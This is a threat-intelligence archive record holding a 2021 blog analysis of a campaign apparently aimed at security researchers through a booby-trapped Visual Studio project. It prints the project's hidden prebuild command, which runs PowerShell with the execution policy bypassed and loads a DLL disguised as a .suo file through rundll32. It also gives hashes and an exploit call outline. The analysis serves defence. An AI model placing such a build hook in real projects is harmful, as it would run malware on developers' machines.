{
    "id": "630a99b3-f368-47e6-acd2-042dd3346465",
    "created_at": "2023-01-12T15:03:59.912316Z",
    "updated_at": "2025-03-27T02:05:26.461528Z",
    "deleted_at": null,
    "sha1_hash": "5cf5c60cf96832e570e96f7675f2511bdb9053ee",
    "title": "2021-01-26 - PANDORABOX - North Koreans target security researchers",
    "authors": "",
    "file_creation_date": "2022-05-28T21:38:07Z",
    "file_modification_date": "2022-05-28T21:38:07Z",
    "file_size": 944424,
    "plain_text": "# PANDORABOX - North Koreans target security researchers\n\n**[comae.com/posts/pandorabox-north-koreans-target-security-researchers/](https://www.comae.com/posts/pandorabox-north-koreans-target-security-researchers/)**\n\nPosted by Matt Suiche | Published on January 26, 2021\n\nTags: `apt` `lazarus`\n\nReading time: 3 minutes.\n\nTable Of Contents:\n\n## Introduction\n\nToday, [Googleâ€™s Threat Analysis Group (TAG) published a blogpost explaining that several](https://blog.google/threat-analysis-group/new-campaign-targeting-security-researchers/)\nsecurity researchers have been targeted by (allegedly) North Korea. Since the operation\nseems to be targeting the curiosity of security researchers as an enabler for a successful\n\n\n-----\n\noperation, we dubbed this operation `PANDORABOX .`\n\nNo explanation was given on the attribution but Costin Raiu posted a screenshot from the\nKaspersky Threat Attribution Engine which highlights code sharing between Manuscrypt\n(Lazarus). Note, that this alone isnâ€™t enough for a successful attribution as it can be easily\nmisled - maybe Google TAG has more information since they seemed to be so sure about\nwho was behind the operation?\n\nKTAE code similarity analysis for the malware used to target security researchers\ninvolved in 0day analysis and development. \"Manuscrypt\" (also known as FALLCHILL)\nis typically used by the Lazarus APT. ðŸ‘‰ [pic.twitter.com/hXxuJIj9Lc](https://t.co/hXxuJIj9Lc)\n\n[â€” Costin Raiu (@craiu) January 26, 2021](https://twitter.com/craiu/status/1353964086455902208?ref_src=twsrc%5Etfw)\n\nThe campaign seems to have been on-going for a while because the persona James Willy\n[(james0x40) created his GitHub account on the 16th April 2020.](https://api.github.com/users/james0x40)\n\nTwo attack vectors were identified:\n\nThe attacker would send a link to their blog, which would trigger a Chrome exploit\n[(CVE-2020-15994 ?) and infect the machine.](https://twitter.com/pwn_expoit/status/1353989996500328448)\n\n\n-----\n\nThe attacker would share a malicious visual studio project ( lpe-poc.zip ) over email\nor Telegram.\n\n## Visual Studio Project\n\nWe will focus on the Visual Studio project. The `dxgkrnl_poc.vcxproj VS project contains`\na prebuild command which force-load `dxgkrnl_poc.vcxproj.suo . As you can see the`\nattackers, added several whitespaces to not make the command too obvious when someone\nwould have a look.\n```\n  <PreBuildEvent>\n   <Command>                                   \npowershell -executionpolicy bypass -windowstyle hidden \nif(([system.environment]::osversion.version.major -eq 10) -and\n[system.environment]::is64bitoperatingsystem -and (Test-Path\n$(TargetName).vcxproj.suo)){rundll32 $(TargetName).vcxproj.suo,CMS_dataFinal\nBx9yb37GEcJNK6bt 4231}</Command>\n  </PreBuildEvent>\npowershell -executionpolicy bypass -windowstyle hidden\nif(([system.environment]::osversion.version.major -eq 10) -and\n[system.environment]::is64bitoperatingsystem -and (Test-Path\n\n```\n\n-----\n\n```\n$(TargetName).vcxproj.suo)){rundll32 $(TargetName).vcxproj.suo,CMS_dataFinal\nBx9yb37GEcJNK6bt 4231}\n\n```\nThe first parameter ( Bx9yb37GEcJNK6bt ) which is decryption key for strings, the same key\ncan be found in the Googleâ€™s TAG blogpost - which makes sense if the DLL shared across all\nthe targets is the same. Unlike the second parameter - here `4231 - which is different from`\nthe Google TAG id ( 4901 ) this could be a potential identifier for the victims. This imply that\nthe Visual Studio Project file had to be modified before being sent to each victim. Although,\n5000 seems like a very high number of security researchers to be targeted. I donâ€™t even\nknow if the global pool of security researchers is that big. Nonetheless, if you have been\ntargeted donâ€™t hesitate to ping me on twitter at @msuiche to confirm your id is also different.\n\nThe `dxgkrnl_poc.vcxproj.suo dll SHA2 hash is the following`\n```\n4C3499F3CC4A4FDC7E67417E055891C78540282DCCC57E37A01167DFE351B244. More\n\n```\n[information about this file can be found on Norfolk blog.](https://norfolkinfosec.com/dprk-malware-targeting-security-researchers/)\n\n## Project 1: D3DKMTPresentMultiPlaneOverlay3\n\nWhatâ€™s the LPE, though?\n```\nvoid main()\n{\n     EnumerateAdapters1();\n     DxgkCreateDevice();\n     DxgkCreateContext();\n     DxgkCreatePrimaryAllocation();\n     DxgkSetVidPnSourceOwner();\n     DxgkSetDisplayMode();\n     DxgkPresentMutiPlaneOverlay3();\n}\n\n```\nThe LPE seems to be targeted a DirectX vulnerability, which we were not able to reproduce,\n[which gets triggered by D3DKMTPresentMultiPlaneOverlay3 function.](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/d3dkmthk/nf-d3dkmthk-d3dkmtpresentmultiplaneoverlay3)\n\nThis is kind of ironic because the group seems to have also targeted k0shl who wrote a\nblogpost about a `D3DKMTPresentMultiPlaneOverlay3 vulnerability (CVE-2018-8165`\nfound by Richard Zhu) few years ago.\n\nOK, I don't want to cheer with you now.ðŸ˜¡ [https://t.co/hl3h4S5JtT](https://t.co/hl3h4S5JtT)\n[pic.twitter.com/dU2tW9WzD9](https://t.co/dU2tW9WzD9)\n\nâ€” k0shl (@KeyZ3r0) [January 26, 2021](https://twitter.com/KeyZ3r0/status/1353942078338686977?ref_src=twsrc%5Etfw)\n\n\n-----\n\nNo additional details on the `dxgkrnl!DxgkPresentMultiPlaneOverlay3 vulnerability will`\nbe provided since we are unable to say if we werenâ€™t able to reproduce the issue because\nonly specific configurations can be triggered or because this vulnerability has already been\npatched.\n\n## Project 2: Direct Composition Vulnerability (CVE-2020-17057)\n\nThere is a also second archive that was shared with the security researchers with a working\n[exploit for what seem to be CVE-2020-17057.](https://blogs.360.cn/post/cve-2020-17057%20detail%20and%20exploit.html)\n\n## Conclusion\n\nIf you have a different id as a second parameter for the archive donâ€™t hesitate to contact me\non Twitter at @msuiche, and if you encountered another archive project too. It would be\ninteresting to connect the dots.\n\n[360 Threat Intelligence Team linked the operation to the DREAMJOB Operation.](https://mp.weixin.qq.com/s/W-C_tKVnXco8C3ctgAjoNQ)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-01-26 - PANDORABOX - North Koreans target security researchers.pdf"
    ],
    "report_names": [
        "2021-01-26 - PANDORABOX - North Koreans target security researchers.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535839,
    "ts_updated_at": 1743041126,
    "ts_creation_date": 1653773887,
    "ts_modification_date": 1653773887,
    "files": {
        "pdf": "https://archive.orkl.eu/5cf5c60cf96832e570e96f7675f2511bdb9053ee.pdf",
        "text": "https://archive.orkl.eu/5cf5c60cf96832e570e96f7675f2511bdb9053ee.txt",
        "img": "https://archive.orkl.eu/5cf5c60cf96832e570e96f7675f2511bdb9053ee.jpg"
    }
}